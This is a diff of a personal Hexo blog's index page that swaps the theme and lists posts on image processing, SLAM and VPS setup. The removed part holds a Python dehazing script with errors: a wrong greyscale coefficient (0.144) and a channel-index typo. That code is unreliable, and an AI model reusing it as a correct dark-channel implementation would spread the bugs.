print(t.shape)</span><br><span class="line">    cv2.imshow(<span class="string">"windows"</span>, t)</span><br><span class="line">    </span><br><span class="line">    cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">    cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/15/dehaze/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/15/dehaze/" class="post-title-link" itemprop="url">Dehaze（去雾算法）</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-04-15 21:00:14" itemprop="dateCreated datePublished" datetime="2019-04-15T21:00:14+08:00">2019-04-15</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-01-24 22:24:05" itemprop="dateModified" datetime="2020-01-24T22:24:05+08:00">2020-01-24</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="去雾算法的python实现"><a href="#去雾算法的python实现" class="headerlink" title="去雾算法的python实现"></a>去雾算法的python实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 图像去雾</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.ndimage.filters <span class="keyword">import</span> convolve</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">togray</span><span class="params">(src)</span>:</span></span><br><span class="line">    img = np.array(src, np.float)</span><br><span class="line">    res = (img[:, :, <span class="number">0</span>]*<span class="number">0.299</span>+img[:, :, <span class="number">1</span>]*<span class="number">0.587</span>+img[:, :, <span class="number">2</span>]*<span class="number">0.144</span>)</span><br><span class="line">    <span class="keyword">return</span> res.astype(np.uint8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mean</span><span class="params">(src, size)</span>:</span></span><br><span class="line">    filter_ = np.zeros(size)+<span class="number">1.0</span>/(size[<span class="number">0</span>]*size[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> convolve(src, filter_)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guidefilter</span><span class="params">(I, P, r, exps)</span>:</span></span><br><span class="line">    w = (<span class="number">2</span>*r+<span class="number">1</span>, <span class="number">2</span>*r+<span class="number">1</span>)</span><br><span class="line">    meani = mean(I, w)</span><br><span class="line">    meanp = mean(P, w)</span><br><span class="line"></span><br><span class="line">    corri = mean(I*I, w)</span><br><span class="line">    corrip = mean(I*P, w)</span><br><span class="line"></span><br><span class="line">    vari = corri-meani*meani</span><br><span class="line">    covip = corrip-meani*meanp</span><br><span class="line"></span><br><span class="line">    a = covip/(vari+exps)</span><br><span class="line">    b = meanp-a*meani</span><br><span class="line"></span><br><span class="line">    meana = mean(a, w)</span><br><span class="line">    meanb = mean(b, w)</span><br><span class="line">    q = meana*I+meanb</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dark</span><span class="params">(src, exps,r=<span class="number">1</span>)</span>:</span></span><br><span class="line">    t = np.min(src, axis=<span class="number">2</span>)</span><br><span class="line">    w, h = t.shape</span><br><span class="line">    v = t.copy()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(r+<span class="number">1</span>):</span><br><span class="line">        v[<span class="number">0</span>:w-i, <span class="number">0</span>:h -</span><br><span class="line">            i] = np.min(np.stack([v[<span class="number">0</span>:w-i, <span class="number">0</span>:h-i], t[i:w, i:h]], axis=<span class="number">2</span>), axis=<span class="number">2</span>)</span><br><span class="line">        v[i:w, i:h] = np.min(</span><br><span class="line">            np.stack([v[i:w, i:h], t[<span class="number">0</span>:w-i, <span class="number">0</span>:h-i]], axis=<span class="number">2</span>), axis=<span class="number">2</span>)</span><br><span class="line">    res = guidefilter(t, v, r, exps)</span><br><span class="line">    cv2.imshow(<span class="string">"dark"</span>,np.hstack([v,res]).astype(np.uint8))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v</span><span class="params">(src, exps,r=<span class="number">1</span>)</span>:</span></span><br><span class="line">    t = np.min(src, axis=<span class="number">2</span>)</span><br><span class="line">    w, h = t.shape</span><br><span class="line">    v = t.copy()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(r+<span class="number">1</span>):</span><br><span class="line">        v[<span class="number">0</span>:w-i, <span class="number">0</span>:h -</span><br><span class="line">            i] = np.min(np.stack([v[<span class="number">0</span>:w-i, <span class="number">0</span>:h-i], t[i:w, i:h]], axis=<span class="number">2</span>), axis=<span class="number">2</span>)</span><br><span class="line">        v[i:w, i:h] = np.min(</span><br><span class="line">            np.stack([v[i:w, i:h], t[<span class="number">0</span>:w-i, <span class="number">0</span>:h-i]], axis=<span class="number">2</span>), axis=<span class="number">2</span>)</span><br><span class="line">    res = guidefilter(t, v, r, exps)</span><br><span class="line">    <span class="comment"># cv2.imshow("dark",np.hstack([v,res]).astype(np.uint8))</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_A</span><span class="params">(src,dark)</span>:</span></span><br><span class="line">    bins = <span class="number">2000</span></span><br><span class="line">    ht = np.histogram(dark, bins)                              </span><br><span class="line">    d = np.cumsum(ht[<span class="number">0</span>])/float(dark.size)</span><br><span class="line">    <span class="keyword">for</span> lmax <span class="keyword">in</span> range(bins<span class="number">-1</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> d[lmax]&lt;=<span class="number">0.999</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    A  = np.mean(src,<span class="number">2</span>)[dark&gt;=ht[<span class="number">1</span>][lmax]].max()</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehaze</span><span class="params">(src, size, w=<span class="number">0.95</span>,exps=<span class="number">0.001</span>)</span>:</span></span><br><span class="line">    img = np.array(src, dtype=np.float)</span><br><span class="line">    print(<span class="string">"img"</span>, img)</span><br><span class="line"></span><br><span class="line">    A0 = np.max(img[:, :, <span class="number">0</span>])</span><br><span class="line">    A1 = np.max(img[:, :, <span class="number">1</span>])</span><br><span class="line">    A2 = np.max(img[:, :, <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dark = get_dark(img, size//2)</span></span><br><span class="line">    <span class="comment"># print("dark", dark)</span></span><br><span class="line"></span><br><span class="line">    ia = img.copy()</span><br><span class="line">    ia[:, :, <span class="number">0</span>] = ia[:, :, <span class="number">0</span>]/A0</span><br><span class="line">    ia[:, :, <span class="number">1</span>] = ia[:, :, <span class="number">1</span>]/A1</span><br><span class="line">    ia[:, :, <span class="number">1</span>] = ia[:, :, <span class="number">2</span>]/A2</span><br><span class="line"></span><br><span class="line">    v=get_v(ia,exps,size//<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># dark=get_dark(img, exps,size//2)</span></span><br><span class="line">    <span class="comment"># cv2.imshow("dark",dark.astype(np.uint8))</span></span><br><span class="line">    <span class="comment"># A=np.max(img)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># A=get_A(img,dark)</span></span><br><span class="line">    t = <span class="number">1</span> - w*v</span><br><span class="line">    t = np.where(t &lt; <span class="number">0.1</span>, <span class="number">0.1</span>, t)</span><br><span class="line">    print(t.shape)</span><br><span class="line">    print(<span class="string">"t"</span>, t)</span><br><span class="line"></span><br><span class="line">    res = np.zeros(img.shape)</span><br><span class="line">    res[:, :, <span class="number">0</span>] = (img[:, :, <span class="number">0</span>]-A0)/t+A0</span><br><span class="line">    res[:, :, <span class="number">1</span>] = (img[:, :, <span class="number">1</span>]-A1)/t+A1</span><br><span class="line">    res[:, :, <span class="number">2</span>] = (img[:, :, <span class="number">2</span>]-A2)/t+A2</span><br><span class="line">    print(<span class="string">"res"</span>, res)</span><br><span class="line">    res = res.astype(np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">"/Users/kaneiki/Desktop/Image_Processing/imgs/haze4.png"</span>)</span><br><span class="line">img_ans = dehaze(img, <span class="number">5</span>, <span class="number">0.8</span>)</span><br><span class="line"></span><br><span class="line">show = np.hstack([img, img_ans])</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">"img_ans"</span>, show)</span><br><span class="line"></span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/15/how to post the blog/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/04/15/how to post the blog/" class="post-title-link" itemprop="url">Hello World</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-04-15 19:52:26" itemprop="dateCreated datePublished" datetime="2019-04-15T19:52:26+08:00">2019-04-15</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-01-24 21:21:25" itemprop="dateModified" datetime="2020-01-24T21:21:25+08:00">2020-01-24</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
-
-
-          </div>
-          
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">kaneiki wang</p>
-              <div class="site-description motion-element" itemprop="description"></div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">10</span>
-                    <span class="site-state-item-name">posts</span>
-                  </a>
-                </div>
-              
-
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  
+    </h2>
+
+    <nav class="links">
+        <button class="social-button">
+            menu
+        </button>
+        <ul class="social-links hide-links">
+            
+                <li>
+                    <a href="https://github.com/FrontendSophie">
+                        Github
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://www.linkedin.com/in/frontendsophie/">
+                        LinkedIn
+                    </a>
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+                <main class="main">
                     
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">6</span>
-                    <span class="site-state-item-name">tags</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-
-          
-
-          
-
-          
-
-          
-          
-
-          
+<section class="posts">
+    
+        <article class="post">
             
-          
-          
+                    <h1 class="post-title">
+                        <a href="/2020/10/21/rand-heap/">
+                            rand_heap
+                        </a>
+                    </h1>
 
+                    <ul class="post-date">
+                        <li>
+                            October 21, 2020
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2020/10/21/rand-heap/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+        <article class="post">
+            
+                    <h1 class="post-title">
+                        <a href="/2020/02/08/joseph-ping/">
+                            约瑟夫环
+                        </a>
+                    </h1>
+
+                    <ul class="post-date">
+                        <li>
+                            February 8, 2020
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                        <div class="post-cover">
+                            <img src="/2020/02/08/joseph-ping/2.jpeg">
+                        </div>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2020/02/08/joseph-ping/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+        <article class="post">
+            
+                    <h1 class="post-title">
+                        <a href="/2020/01/27/dns-collect/">
+                            DNS收集
+                        </a>
+                    </h1>
+
+                    <ul class="post-date">
+                        <li>
+                            January 27, 2020
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2020/01/27/dns-collect/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+        <article class="post">
+            
+                    <h1 class="post-title">
+                        <a href="/2020/01/26/vps-build/">
+                            VPS服务器配置
+                        </a>
+                    </h1>
+
+                    <ul class="post-date">
+                        <li>
+                            January 26, 2020
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                        <div class="post-cover">
+                            <img src="/2020/01/26/vps-build/01/26/vps-build/example.png">
+                        </div>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2020/01/26/vps-build/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+        <article class="post">
+            
+                    <h1 class="post-title">
+                        <a href="/2019/08/28/Booth算法/">
+                            Booth算法
+                        </a>
+                    </h1>
+
+                    <ul class="post-date">
+                        <li>
+                            August 28, 2019
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                        <div class="post-cover">
+                            <img src="/2019/08/28/Booth算法/example.jpg">
+                        </div>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2019/08/28/Booth算法/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+        <article class="post">
+            
+                    <h1 class="post-title">
+                        <a href="/2019/07/11/ros读取图像/">
+                            ROS+OpenCV读取图像
+                        </a>
+                    </h1>
+
+                    <ul class="post-date">
+                        <li>
+                            July 11, 2019
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2019/07/11/ros读取图像/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+        <article class="post">
+            
+                    <h1 class="post-title">
+                        <a href="/2019/07/06/Ubuntu1604-SLAM-kinectv1/">
+                            Ubuntu1604+SLAM+kinectv1
+                        </a>
+                    </h1>
+
+                    <ul class="post-date">
+                        <li>
+                            July 6, 2019
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2019/07/06/Ubuntu1604-SLAM-kinectv1/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+        <article class="post">
+            
+                    <h1 class="post-title">
+                        <a href="/2019/04/16/SeamCarving/">
+                            SeamCarving
+                        </a>
+                    </h1>
+
+                    <ul class="post-date">
+                        <li>
+                            April 16, 2019
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2019/04/16/SeamCarving/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+        <article class="post">
+            
+                    <h1 class="post-title">
+                        <a href="/2019/04/15/dehaze/">
+                            Dehaze（去雾算法）
+                        </a>
+                    </h1>
+
+                    <ul class="post-date">
+                        <li>
+                            April 15, 2019
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2019/04/15/dehaze/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+        <article class="post">
+            
+                    <h1 class="post-title">
+                        <a href="/2019/04/15/how to post the blog/">
+                            Hello World
+                        </a>
+                    </h1>
+
+                    <ul class="post-date">
+                        <li>
+                            April 15, 2019
+                        </li>
+                        <li>
+                            kaneiki wang
+                        </li>
+                    </ul>
+                    
+                    <div class="post-content ">
+                        
+                            <a href="/2019/04/15/how to post the blog/" class="more-link">Continue reading</a>
+                    </div>
+        </article>
+        
+</section>
+
+                </main>
+                <aside class="aside">
+                    <section class="aside-section">
+                        
+    <h1>Categories</h1>
+
+    
+
+                    </section>
+                    <section class="aside-section">
+                        
+    <h1>Archives</h1>
+
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li></ul>
+
+
+                    </section>
+                    <section class="aside-section tag">
+                        
+    <h1>Tags</h1>
+
+    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ORB-SLAM2/">ORB_SLAM2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vps-科学上网/">vps(科学上网)</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/图像处理/">图像处理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网络安全/">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机组成原理/">计算机组成原理</a></li></ul>
+
+                    </section>
+                </aside>
         </div>
-      </div>
+    </body>
 
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">kaneiki wang</span>
-
-  
-
-  
-</div>
-
-
-  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/schemes/muse.js?v=7.1.0"></script>
-
-
-
-  
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-
-  
-
-
-
-
-  
-
-  
-
-  
-  
-
-  
-  
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-        
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-  
-
-  
-    
-      <script type="text/x-mathjax-config">
-  
-
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$', '$'], ['\\(', '\\)'] ],
-      processEscapes: true,
-      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-    },
-    TeX: {
-      
-      equationNumbers: {
-        autoNumber: 'AMS'
-      }
-    }
-  });
-  MathJax.Hub.Register.StartupHook('TeX Jax Ready', function() {
-    MathJax.InputJax.TeX.prefilterHooks.Add(function(data) {
-      if (data.display) {
-        var next = data.script.nextSibling;
-        while (next && next.nodeName.toLowerCase() === '#text') { next = next.nextSibling }
-        if (next && next.nodeName.toLowerCase() === 'br') { next.parentNode.removeChild(next) }
-      }
-    });
-  });
-</script>
-
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Queue(function() {
-    var all = MathJax.Hub.getAllJax(), i;
-    for (i = 0; i < all.length; i += 1) {
-      document.getElementById(all[i].inputID + '-Frame').parentNode.className += ' has-jax';
-    }
-  });
-</script>
-<script src="//cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-
-    
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-</body>
 </html>
